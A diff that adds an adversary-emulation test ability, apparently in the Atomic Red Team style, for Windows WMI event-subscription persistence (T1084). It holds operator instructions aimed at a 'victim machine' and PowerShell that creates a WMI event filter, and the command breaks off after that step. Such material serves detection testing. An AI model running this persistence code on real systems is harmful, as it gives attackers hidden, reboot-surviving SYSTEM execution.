@@ -1,0 +1,18 @@
+---
+
+- id: tacpersi-1084-AR00-1v00-200121075649
+  name: Persistence
+  description: .      Run from an administrator powershell window.  .      After running, reboot the victim machine. After it has been online for 4 minutes you should see notepad.exe running as SYSTEM..  .      Code references.  .      https.//gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af.  .      https.//github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545.  
+  tactic: persistence
+  technique:
+    attack_id: T1084
+    name: Windows Management Instrumentation Event Subscription
+  platforms:
+    windows:
+      psh:
+        command: |
+          $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
+                          EventNameSpace='root\CimV2';
+                          QueryLanguage="WQL";
+                          Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
+          $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
